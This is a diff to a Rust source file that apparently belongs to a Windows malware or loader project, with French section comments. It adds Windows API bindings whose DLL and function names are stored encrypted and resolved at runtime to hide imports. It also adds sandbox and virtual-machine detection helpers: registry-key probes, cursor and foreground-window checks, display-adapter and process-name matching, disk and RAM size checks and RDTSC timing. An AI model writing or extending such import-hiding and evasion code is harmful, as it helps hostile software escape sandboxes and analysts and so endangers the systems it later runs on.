@@ -21,6 +21,23 @@ use crate::polymorphic_keys::{
     CRYPT32_DLL_ENC_KEY, CRYPT32_DLL_ENC_NONCE, CRYPT32_DLL_ENC_CT,
     KERNEL32_DLL_ENC_KEY, KERNEL32_DLL_ENC_NONCE, KERNEL32_DLL_ENC_CT,
     USER32_DLL_ENC_KEY, USER32_DLL_ENC_NONCE, USER32_DLL_ENC_CT,
+    ADVAPI32_DLL_ENC_KEY, ADVAPI32_DLL_ENC_NONCE, ADVAPI32_DLL_ENC_CT,
+    REGOPENKEYEXW_ENC_KEY, REGOPENKEYEXW_ENC_NONCE, REGOPENKEYEXW_ENC_CT,
+    REGCLOSEKEY_ENC_KEY, REGCLOSEKEY_ENC_NONCE, REGCLOSEKEY_ENC_CT,
+    GETCURSORPOS_ENC_KEY, GETCURSORPOS_ENC_NONCE, GETCURSORPOS_ENC_CT,
+    GETFOREGROUNDWINDOW_ENC_KEY, GETFOREGROUNDWINDOW_ENC_NONCE, GETFOREGROUNDWINDOW_ENC_CT,
+    ENUMDISPLAYDEVICESW_ENC_KEY, ENUMDISPLAYDEVICESW_ENC_NONCE, ENUMDISPLAYDEVICESW_ENC_CT,
+    CREATETOOLHELP32SNAPSHOT_ENC_KEY, CREATETOOLHELP32SNAPSHOT_ENC_NONCE, CREATETOOLHELP32SNAPSHOT_ENC_CT,
+    PROCESS32FIRSTW_ENC_KEY, PROCESS32FIRSTW_ENC_NONCE, PROCESS32FIRSTW_ENC_CT,
+    PROCESS32NEXTW_ENC_KEY, PROCESS32NEXTW_ENC_NONCE, PROCESS32NEXTW_ENC_CT,
+    CLOSEHANDLE_ENC_KEY, CLOSEHANDLE_ENC_NONCE, CLOSEHANDLE_ENC_CT,
+    OPENPROCESS_ENC_KEY, OPENPROCESS_ENC_NONCE, OPENPROCESS_ENC_CT,
+    QUERYFULLPROCESSIMAGENAMEW_ENC_KEY, QUERYFULLPROCESSIMAGENAMEW_ENC_NONCE, QUERYFULLPROCESSIMAGENAMEW_ENC_CT,
+    NTDLL_DLL_ENC_KEY, NTDLL_DLL_ENC_NONCE, NTDLL_DLL_ENC_CT,
+    NTQUERYSYSTEMINFORMATION_ENC_KEY, NTQUERYSYSTEMINFORMATION_ENC_NONCE, NTQUERYSYSTEMINFORMATION_ENC_CT,
+    GETDISKFREESPACEEXW_ENC_KEY, GETDISKFREESPACEEXW_ENC_NONCE, GETDISKFREESPACEEXW_ENC_CT,
+    GETVOLUMEINFORMATIONW_ENC_KEY, GETVOLUMEINFORMATIONW_ENC_NONCE, GETVOLUMEINFORMATIONW_ENC_CT,
+    GETPHYSICALLYINSTALLEDSYSTEMMEMORY_ENC_KEY, GETPHYSICALLYINSTALLEDSYSTEMMEMORY_ENC_NONCE, GETPHYSICALLYINSTALLEDSYSTEMMEMORY_ENC_CT,
 };
 
 // ── Types Windows nécessaires (définis manuellement) ──
@@ -30,6 +47,44 @@ pub struct CRYPT_INTEGER_BLOB {
     pub cbData: u32,
     pub pbData: *mut u8,
 }
+
+#[repr(C)]
+pub struct POINT {
+    pub x: i32,
+    pub y: i32,
+}
+
+#[repr(C)]
+pub struct DISPLAY_DEVICEW {
+    pub cb: u32,
+    pub DeviceName: [u16; 32],
+    pub DeviceString: [u16; 128],
+    pub StateFlags: u32,
+    pub DeviceID: [u16; 128],
+    pub DeviceKey: [u16; 128],
+}
+
+#[repr(C)]
+pub struct PROCESSENTRY32W {
+    pub dwSize: u32,
+    pub cntUsage: u32,
+    pub th32ProcessID: u32,
+    pub th32DefaultHeapID: usize,
+    pub th32ModuleID: u32,
+    pub cntThreads: u32,
+    pub th32ParentProcessID: u32,
+    pub pcPriClassBase: i32,
+    pub dwFlags: u32,
+    pub szExeFile: [u16; 260],
+}
+
+pub const TH32CS_SNAPPROCESS: u32 = 0x00000002;
+pub const PROCESS_QUERY_LIMITED_INFORMATION: u32 = 0x1000;
+pub const HKEY_LOCAL_MACHINE: *mut u8 = 0x80000002u64 as *mut u8;
+pub const HKEY_CURRENT_USER: *mut u8 = 0x80000001u64 as *mut u8;
+pub const KEY_READ: u32 = 0x20019;
+pub const DISPLAY_DEVICE_ACTIVE: u32 = 0x1;
+pub const SystemProcessInformation: u32 = 5;
 
 #[repr(C)]
 pub struct SYSTEM_INFO {
@@ -147,6 +202,81 @@ declare_api!(GlobalMemoryStatusEx,
     KERNEL32_DLL_ENC_CT,         KERNEL32_DLL_ENC_KEY,         KERNEL32_DLL_ENC_NONCE,
     GLOBALMEMORYSTATUSEX_ENC_CT, GLOBALMEMORYSTATUSEX_ENC_KEY, GLOBALMEMORYSTATUSEX_ENC_NONCE,
     unsafe extern "system" fn(*mut MEMORYSTATUSEX) -> i32);
+
+declare_api!(RegOpenKeyExW,
+    ADVAPI32_DLL_ENC_CT, ADVAPI32_DLL_ENC_KEY, ADVAPI32_DLL_ENC_NONCE,
+    REGOPENKEYEXW_ENC_CT, REGOPENKEYEXW_ENC_KEY, REGOPENKEYEXW_ENC_NONCE,
+    unsafe extern "system" fn(*mut u8, *const u16, u32, u32, *mut *mut u8) -> i32);
+
+declare_api!(RegCloseKey,
+    ADVAPI32_DLL_ENC_CT, ADVAPI32_DLL_ENC_KEY, ADVAPI32_DLL_ENC_NONCE,
+    REGCLOSEKEY_ENC_CT, REGCLOSEKEY_ENC_KEY, REGCLOSEKEY_ENC_NONCE,
+    unsafe extern "system" fn(*mut u8) -> i32);
+
+declare_api!(GetCursorPos,
+    USER32_DLL_ENC_CT, USER32_DLL_ENC_KEY, USER32_DLL_ENC_NONCE,
+    GETCURSORPOS_ENC_CT, GETCURSORPOS_ENC_KEY, GETCURSORPOS_ENC_NONCE,
+    unsafe extern "system" fn(*mut POINT) -> i32);
+
+declare_api!(GetForegroundWindow,
+    USER32_DLL_ENC_CT, USER32_DLL_ENC_KEY, USER32_DLL_ENC_NONCE,
+    GETFOREGROUNDWINDOW_ENC_CT, GETFOREGROUNDWINDOW_ENC_KEY, GETFOREGROUNDWINDOW_ENC_NONCE,
+    unsafe extern "system" fn() -> *mut u8);
+
+declare_api!(EnumDisplayDevicesW,
+    USER32_DLL_ENC_CT, USER32_DLL_ENC_KEY, USER32_DLL_ENC_NONCE,
+    ENUMDISPLAYDEVICESW_ENC_CT, ENUMDISPLAYDEVICESW_ENC_KEY, ENUMDISPLAYDEVICESW_ENC_NONCE,
+    unsafe extern "system" fn(*const u16, u32, *mut DISPLAY_DEVICEW, u32) -> i32);
+
+declare_api!(CreateToolhelp32Snapshot,
+    KERNEL32_DLL_ENC_CT, KERNEL32_DLL_ENC_KEY, KERNEL32_DLL_ENC_NONCE,
+    CREATETOOLHELP32SNAPSHOT_ENC_CT, CREATETOOLHELP32SNAPSHOT_ENC_KEY, CREATETOOLHELP32SNAPSHOT_ENC_NONCE,
+    unsafe extern "system" fn(u32, u32) -> *mut u8);
+
+declare_api!(Process32FirstW,
+    KERNEL32_DLL_ENC_CT, KERNEL32_DLL_ENC_KEY, KERNEL32_DLL_ENC_NONCE,
+    PROCESS32FIRSTW_ENC_CT, PROCESS32FIRSTW_ENC_KEY, PROCESS32FIRSTW_ENC_NONCE,
+    unsafe extern "system" fn(*mut u8, *mut PROCESSENTRY32W) -> i32);
+
+declare_api!(Process32NextW,
+    KERNEL32_DLL_ENC_CT, KERNEL32_DLL_ENC_KEY, KERNEL32_DLL_ENC_NONCE,
+    PROCESS32NEXTW_ENC_CT, PROCESS32NEXTW_ENC_KEY, PROCESS32NEXTW_ENC_NONCE,
+    unsafe extern "system" fn(*mut u8, *mut PROCESSENTRY32W) -> i32);
+
+declare_api!(CloseHandle,
+    KERNEL32_DLL_ENC_CT, KERNEL32_DLL_ENC_KEY, KERNEL32_DLL_ENC_NONCE,
+    CLOSEHANDLE_ENC_CT, CLOSEHANDLE_ENC_KEY, CLOSEHANDLE_ENC_NONCE,
+    unsafe extern "system" fn(*mut u8) -> i32);
+
+declare_api!(OpenProcess,
+    KERNEL32_DLL_ENC_CT, KERNEL32_DLL_ENC_KEY, KERNEL32_DLL_ENC_NONCE,
+    OPENPROCESS_ENC_CT, OPENPROCESS_ENC_KEY, OPENPROCESS_ENC_NONCE,
+    unsafe extern "system" fn(u32, i32, u32) -> *mut u8);
+
+declare_api!(QueryFullProcessImageNameW,
+    KERNEL32_DLL_ENC_CT, KERNEL32_DLL_ENC_KEY, KERNEL32_DLL_ENC_NONCE,
+    QUERYFULLPROCESSIMAGENAMEW_ENC_CT, QUERYFULLPROCESSIMAGENAMEW_ENC_KEY, QUERYFULLPROCESSIMAGENAMEW_ENC_NONCE,
+    unsafe extern "system" fn(*mut u8, u32, *mut u16, *mut u32) -> i32);
+
+declare_api!(NtQuerySystemInformation,
+    NTDLL_DLL_ENC_CT, NTDLL_DLL_ENC_KEY, NTDLL_DLL_ENC_NONCE,
+    NTQUERYSYSTEMINFORMATION_ENC_CT, NTQUERYSYSTEMINFORMATION_ENC_KEY, NTQUERYSYSTEMINFORMATION_ENC_NONCE,
+    unsafe extern "system" fn(u32, *mut u8, u32, *mut u32) -> i32);
+
+declare_api!(GetDiskFreeSpaceExW,
+    KERNEL32_DLL_ENC_CT, KERNEL32_DLL_ENC_KEY, KERNEL32_DLL_ENC_NONCE,
+    GETDISKFREESPACEEXW_ENC_CT, GETDISKFREESPACEEXW_ENC_KEY, GETDISKFREESPACEEXW_ENC_NONCE,
+    unsafe extern "system" fn(*const u16, *mut u64, *mut u64, *mut u64) -> i32);
+
+declare_api!(GetVolumeInformationW,
+    KERNEL32_DLL_ENC_CT, KERNEL32_DLL_ENC_KEY, KERNEL32_DLL_ENC_NONCE,
+    GETVOLUMEINFORMATIONW_ENC_CT, GETVOLUMEINFORMATIONW_ENC_KEY, GETVOLUMEINFORMATIONW_ENC_NONCE,
+    unsafe extern "system" fn(*const u16, *mut u16, u32, *mut u32, *mut u32, *mut u32, *mut u16, u32) -> i32);
+
+declare_api!(GetPhysicallyInstalledSystemMemory,
+    KERNEL32_DLL_ENC_CT, KERNEL32_DLL_ENC_KEY, KERNEL32_DLL_ENC_NONCE,
+    GETPHYSICALLYINSTALLEDSYSTEMMEMORY_ENC_CT, GETPHYSICALLYINSTALLEDSYSTEMMEMORY_ENC_KEY, GETPHYSICALLYINSTALLEDSYSTEMMEMORY_ENC_NONCE,
+    unsafe extern "system" fn(*mut u64) -> i32);
 
 // ── Fonctions utilitaires ──
 
@@ -288,3 +418,162 @@ pub fn check_ram() -> bool {
         }
     }
 }
+
+/// Returns true if a registry key exists (opens and immediately closes it).
+pub fn reg_key_exists(hive: *mut u8, subkey: &str) -> bool {
+    let func = match RegOpenKeyExW() {
+        Some(f) => f,
+        None => return false,
+    };
+    let close = match RegCloseKey() {
+        Some(f) => f,
+        None => return false,
+    };
+    let wide: Vec<u16> = std::ffi::OsStr::new(subkey).encode_wide().chain(Some(0)).collect();
+    let mut hkey: *mut u8 = std::ptr::null_mut();
+    unsafe {
+        let ret = func(hive, wide.as_ptr(), 0, KEY_READ, &mut hkey);
+        if ret == 0 {
+            close(hkey);
+            true
+        } else {
+            false
+        }
+    }
+}
+
+/// Returns the current cursor position.
+pub fn get_cursor_pos() -> Option<POINT> {
+    let func = GetCursorPos()?;
+    let mut pt = POINT { x: 0, y: 0 };
+    unsafe {
+        if func(&mut pt) != 0 {
+            Some(pt)
+        } else {
+            None
+        }
+    }
+}
+
+/// Returns true if a foreground window is set (not null/invalid).
+pub fn has_foreground_window() -> bool {
+    match GetForegroundWindow() {
+        Some(f) => unsafe { !f().is_null() },
+        None => true,
+    }
+}
+
+/// Returns true if display adapter string contains any of the given substrings.
+pub fn display_device_contains(needles: &[&str]) -> bool {
+    let func = match EnumDisplayDevicesW() {
+        Some(f) => f,
+        None => return false,
+    };
+    unsafe {
+        let mut i = 0u32;
+        loop {
+            let mut dd: DISPLAY_DEVICEW = mem::zeroed();
+            dd.cb = mem::size_of::<DISPLAY_DEVICEW>() as u32;
+            let ret = func(std::ptr::null(), i, &mut dd, 0);
+            if ret == 0 { break; }
+            let dev_str = String::from_utf16_lossy(
+                &dd.DeviceString[..dd.DeviceString.iter().position(|&c| c == 0).unwrap_or(128)]
+            ).to_lowercase();
+            for needle in needles {
+                if dev_str.contains(&needle.to_lowercase()) {
+                    return true;
+                }
+            }
+            i += 1;
+        }
+    }
+    false
+}
+
+/// Enumerate running processes, calling `cb` with lowercased exe name for each.
+/// Returns early if `cb` returns true (found a match).
+pub fn enum_processes<F: Fn(&str) -> bool>(cb: F) -> bool {
+    let snap_fn = match CreateToolhelp32Snapshot() {
+        Some(f) => f,
+        None => return false,
+    };
+    let first_fn = match Process32FirstW() {
+        Some(f) => f,
+        None => return false,
+    };
+    let next_fn = match Process32NextW() {
+        Some(f) => f,
+        None => return false,
+    };
+    let close_fn = match CloseHandle() {
+        Some(f) => f,
+        None => return false,
+    };
+    unsafe {
+        let snap = snap_fn(TH32CS_SNAPPROCESS, 0);
+        let invalid = !0usize as *mut u8;
+        if snap.is_null() || snap == invalid { return false; }
+        let mut pe: PROCESSENTRY32W = mem::zeroed();
+        pe.dwSize = mem::size_of::<PROCESSENTRY32W>() as u32;
+        let mut found = false;
+        if first_fn(snap, &mut pe) != 0 {
+            loop {
+                let name_len = pe.szExeFile.iter().position(|&c| c == 0).unwrap_or(260);
+                let name = String::from_utf16_lossy(&pe.szExeFile[..name_len]).to_lowercase();
+                if cb(&name) {
+                    found = true;
+                    break;
+                }
+                pe = mem::zeroed();
+                pe.dwSize = mem::size_of::<PROCESSENTRY32W>() as u32;
+                if next_fn(snap, &mut pe) == 0 { break; }
+            }
+        }
+        close_fn(snap);
+        found
+    }
+}
+
+/// Get total disk size of the system drive (C:\) in bytes. Returns 0 on failure.
+pub fn get_system_disk_size() -> u64 {
+    let func = match GetDiskFreeSpaceExW() {
+        Some(f) => f,
+        None => return 0,
+    };
+    let path: Vec<u16> = std::ffi::OsStr::new("C:\\").encode_wide().chain(Some(0)).collect();
+    let mut _free_caller: u64 = 0;
+    let mut total: u64 = 0;
+    let mut _free_total: u64 = 0;
+    unsafe {
+        func(path.as_ptr(), &mut _free_caller, &mut total, &mut _free_total);
+    }
+    total
+}
+
+/// Get physical RAM size in bytes using GetPhysicallyInstalledSystemMemory.
+pub fn get_physical_ram_kb() -> u64 {
+    let func = match GetPhysicallyInstalledSystemMemory() {
+        Some(f) => f,
+        None => return 0,
+    };
+    let mut kb: u64 = 0;
+    unsafe { func(&mut kb); }
+    kb
+}
+
+/// RDTSC-based timing: measure overhead of a no-op loop.
+/// On a real machine this is very fast; under hypervisors there is often
+/// measurable overhead due to VM exits on RDTSC emulation.
+#[cfg(target_arch = "x86_64")]
+pub fn rdtsc_timing_check() -> u64 {
+    unsafe {
+        let t1 = core::arch::x86_64::_rdtsc();
+        // Tiny busy loop — just enough to measure relative overhead
+        core::arch::asm!("nop", "nop", "nop", "nop", options(nostack, nomem));
+        let t2 = core::arch::x86_64::_rdtsc();
+        t2.wrapping_sub(t1)
+    }
+}
+
+#[cfg(not(target_arch = "x86_64"))]
+pub fn rdtsc_timing_check() -> u64 { 0 }
